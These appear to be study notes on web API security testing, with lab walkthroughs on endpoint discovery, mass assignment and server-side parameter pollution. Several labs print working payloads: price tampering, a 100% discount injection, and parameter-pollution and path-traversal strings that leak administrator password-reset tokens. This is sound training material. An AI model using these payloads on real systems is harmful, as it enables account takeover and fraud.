# API Testing

<br>

## Summary

<!-- MarkdownTOC -->

- [API Recon](#api-recon)
- [API Documentation](#api-documentation)
  - [Lab: Exploiting an API endpoint using documentation](#lab-exploiting-an-api-endpoint-using-documentation)
- [Identifying API endpoints](#identifying-api-endpoints)
  - [Lab: Finding and exploiting an unused API endpoint](#lab-finding-and-exploiting-an-unused-api-endpoint)
- [Finding hidden parameters](#finding-hidden-parameters)
- [Mass Assignment Vulnerabilities](#mass-assignment-vulnerabilities)
  - [Lab: Exploiting a mass assignment vulnerability](#lab-exploiting-a-mass-assignment-vulnerability)
- [Server-side parameter pollution](#server-side-parameter-pollution)
  - [Testing for server-side parameter pollution in the query string](#testing-for-server-side-parameter-pollution-in-the-query-string)
    - [Lab: Exploiting server-side parameter pollution in a query string](#lab-exploiting-server-side-parameter-pollution-in-a-query-string)
  - [Testing for server-side parameter pollution in REST paths](#testing-for-server-side-parameter-pollution-in-rest-paths)
    - [Lab: Exploiting server-side parameter pollution in a REST URL](#lab-exploiting-server-side-parameter-pollution-in-a-rest-url)
  - [Testing for server-side parameter pollution in structured data formats](#testing-for-server-side-parameter-pollution-in-structured-data-formats)
  - [Testing with automated tools](#testing-with-automated-tools)

<!-- /MarkdownTOC -->




<br><br>

### API Recon

* To start API testing, you first need to find out as much information about the API as possible, to discover its attack surface.

* To begin, you should identify API endpoints. These are locations where an API receives requests about a specific resource on its server.

* Example:

```
GET /api/books HTTP/1.1
Host: example.com
```

* Once you have identified the endpoints, you need to determine how to interact with them. This enables you to construct valid HTTP requests to test the API.


    * The input data the API processes, including both compulsory and optional parameters.
    
    * The types of requests the API accepts, including supported HTTP methods and media formats.
    
    * Rate limits and authentication mechanisms.


<br><br>

### API Documentation

* Even if API documentation isn't openly available, you may still be able to access it by browsing applications that use the API. 


* Look for endpoints that may refer to API documentation, for example:

    * /api
    
    * /swagger/index.html
    
    * /openapi.json


* If you identify an endpoint for a resource, make sure to investigate the base path.

	* /api/swagger/v1/users/123

	* /api/swagger/v1
    
    * /api/swagger
    
    * /api

<br>

Using machine-readable documentation

* https://portswigger.net/web-security/api-testing#using-machine-readable-documentation



<br><br>


#### Lab: Exploiting an API endpoint using documentation

* Using all of the functionality that is available in the application uncovers an API endpoint when updating the user's email address:

	* /api/user/wiener

* Request the base API path, discloses the API's functionality in the response:

	* /api/

* API to delete the user carlos: (HTTP method DELETE is used)

	* DELETE /api/user/carlos


<br><br>


### Identifying API endpoints

* Review any JavaScript files as these can disclose API functionality 

* Look for any suggested API endpoints like - /api

* Change the HTTP method and media type (Content-Type header / request body) when requesting the API to determine what is accepted and each endpoint

* As you interact with the API endpoints, review error messages and other responses closely. Sometimes these include information that you can use to construct a valid HTTP request. 

<br>

*  An API endpoint may support different HTTP methods. It's therefore important to test all potential methods when you're investigating API endpoints. This may enable you to identify additional endpoint functionality, opening up more attack surface.

* For example, the endpoint /api/tasks may support the following methods:

    * GET /api/tasks - Retrieves a list of tasks.
    
    * POST /api/tasks - Creates a new task.
    
    * DELETE /api/tasks/1 - Deletes a task.


Note

When testing different HTTP methods, target low-priority objects. This helps make sure that you avoid unintended consequences, for example altering critical items or creating excessive records.


<br>

* Changing the media type for the requests can disclose the following:

    * Trigger errors that disclose useful information.
    
    * Bypass flawed defenses.
    
    * Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.


<br>

* Use Burp Intruder to find hidden API endpoints

* For example, fuzz the last resource in the following path:

    * /api/user/update


<br><br>


#### Lab: Finding and exploiting an unused API endpoint

* Use all of the application's functionality that is available

* When selecting an item to place in our cart, the following API endpoint is disclosed

	* /api/products/1/price

* Send this request to Burp Repeater and change the HTTP method to identify which ones are accepted by the application

* The PATCH method was the one that was accepted, and the application required that application/json media type to be used

* The following request successfully changed the price of the item to 5 cents:


```
PATCH /api/products/1/price HTTP/2
Content-Type: application/json
Content-Length: 11
REDACTED...

{
	"price":5
}
```

<br><br>


### Finding hidden parameters


* Burp includes numerous tools that can help you identify hidden parameters: 

	* Burp Intruder enables you to automatically discover hidden parameters, using a wordlist of common parameter names to replace existing parameters or add new parameters.

	* The Param miner BApp enables you to automatically guess up to 65,536 param names per request. Param miner automatically guesses names that are relevant to the application, based on information taken from the scope.

	* The Content discovery tool enables you to discover content that isn't linked from visible content that you can browse to, including parameters. 


<br><br>


### Mass Assignment Vulnerabilities

*  Since mass assignment creates parameters from object fields, you can often identify these hidden parameters by manually examining objects returned by the API.


* For example, consider a PATCH /api/users/ request, which enables users to update their username and email, and includes the following JSON: 	


```json
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```

* A concurrent GET /api/users/123 request returns the following JSON:


```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

* This may indicate that the hidden id and isAdmin parameters are bound to the internal user object, alongside the updated username and email parameters. 

* Try to include the additional fields in the PATCH method or whatever state-changing methods are available in the application and identify how the application responds.


<br><br>


#### Lab: Exploiting a mass assignment vulnerability


* Use all the functionality that is available from the application to populate Burp's HTTP history so it can be reviewed


* After going through the process of adding an item into our cart and placing an order, the following API endpoints are processed:


* GET /api/checkout

* The GET request returns the following information in the response:

```json
{
  "chosen_discount": {
    "percentage": 0
  },
  "chosen_products": [
    {
      "product_id": "1",
      "name": "Lightweight \"l33t\" Leather Jacket",
      "quantity": 1,
      "item_price": 133700
    }
  ]
}
```


* POST /api/checkout

* The request body contains this information:

```json
{
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

<br>

* Submit the following payload in using the POST /api/checkout request to purchase the item for free:


```json
{
  "chosen_discount": {
    "percentage": 100
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

* We were able to exploit a mass assignment vulnerability in the application by including the "discount percentage" information in the request to place/purchase the order.


<br><br><br>


### Server-side parameter pollution 


* Some systems contain internal APIs that aren't directly accessible from the internet. Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters, which may enable them to, for example:

    * Override existing parameters.
    
    * Modify the application behavior.
    
    * Access unauthorized data.

* You can test any user input for any kind of parameter pollution. For example, query parameters, form fields, headers, and URL path parameters may all be vulnerable. 


Note

This vulnerability is sometimes called HTTP parameter pollution. However, this term is also used to refer to a web application firewall (WAF) bypass technique. To avoid confusion, in this topic we'll only refer to server-side parameter pollution.

In addition, despite the similar name, this vulnerability class has very little in common with server-side prototype pollution.


<br>

#### Testing for server-side parameter pollution in the query string

* To test for server-side parameter pollution in the query string, place query syntax characters like \#, &, and = in your input and observe how the application responds. 

* Truncating query strings

* You can use a URL-encoded \# character to attempt to truncate the server-side request.

```
GET /userSearch?name=peter%23foo&back=/home
```

*  The front-end will try to access the following URL:

```
GET /users/search?name=peter#foo&publicProfile=true
```

*  Review the response for clues about whether the query has been truncated. For example, if the response returns the user peter, the server-side query may have been truncated. If an Invalid name error message is returned, the application may have treated foo as part of the username. This suggests that the server-side request may not have been truncated.

* If you're able to truncate the server-side request, this removes the requirement for the publicProfile field to be set to true. You may be able to exploit this to return non-public user profiles. 


<br>


Note

It's essential that you URL-encode the \# character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.



<br>

##### Lab: Exploiting server-side parameter pollution in a query string

* Submit fuzzing payloads to identify application behavior:

* The following payload returned a "Parameter is not supported" message, which indicates that the injected parameter was processed by the backend API:

```
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26id=test
```

* The following payload returned a "Field not specified" message:

```
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%23test
```

* The following payload returned the email for the provided username: (here we are using the "field" parameter that the application previously mentioned)

```
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26field=email%23
```

* The following payload allowed us to get the "reset_token" value for the administrator user, the parameter name (reset_token) was found by reading through a JavaScript file exposed in the application:

```

csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26field=reset_token%23
```

* Decoded version:

```
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator&field=reset_token#
```

* Finally submit this request for the application to successfully reset the password for the administrator user:

```
GET /forgot-password?reset_token=TOKEN-VALUE HTTP/2
```



<br><br>

#### Testing for server-side parameter pollution in REST paths

*  Consider an application that enables you to edit user profiles based on their username. Requests are sent to the following endpoint:

```
GET /edit_profile.php?name=peter
```

* This results in the following server-side request:

```
GET /api/private/users/peter
```

* An attacker may be able to manipulate server-side URL path parameters to exploit the API. To test for this vulnerability, add path traversal sequences to modify parameters and observe how the application responds. 

* You could submit URL-encoded peter/../admin as the value of the name parameter:

```
GET /edit_profile.php?name=peter%2f..%2fadmin
```

* This may result in the following server-side request:

```
GET /api/private/users/peter/../admin
```


<br>

##### Lab: Exploiting server-side parameter pollution in a REST URL


* The following request is vulnerable to parameter pollution: (username - parameter)

```
POST /forgot-password HTTP/2
REDACTED...

csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&username=administrator
```

The following steps were taken to identify the vulnerability and exploit it to gain access to the admin account:

* This payload returned a different response than the previous requests:

```
csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&username=administrator/../../../../../
```

* This payload still returns the normal response, this indicates that the application is processing the path traversal inputs:

```
csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&username=administrator/../administrator
```

* The following payload returns a verbose error message that discloses the structure of the internal API:

```
csrf=NpAyxU8sqRJrZ5KvnR0WzVLBYTnV3Kt8&username=../../../../openapi.json%23
```

* Decoded version:

```
csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&username=administrator/../../../../../openapi.json#
```

* The following payload will return the "password reset token" for the administrator user.  The variable name (passwordResetToken) was found in a JavaScript file.

```
csrf=NpAyxU8sqRJrZ5KvnR0WzVLBYTnV3Kt8&username=../../../../api/internal/v1/users/administrator/field/passwordResetToken%23
```


<br><br>


#### Testing for server-side parameter pollution in structured data formats

* Review the examples in this section - https://portswigger.net/web-security/api-testing/server-side-parameter-pollution#testing-for-server-side-parameter-pollution-in-structured-data-formats


<br><br>


#### Testing with automated tools

* Burp Scanner automatically detects suspicious input transformations when performing an audit.

* You can also use the Backslash Powered Scanner BApp to identify server-side injection vulnerabilities. 

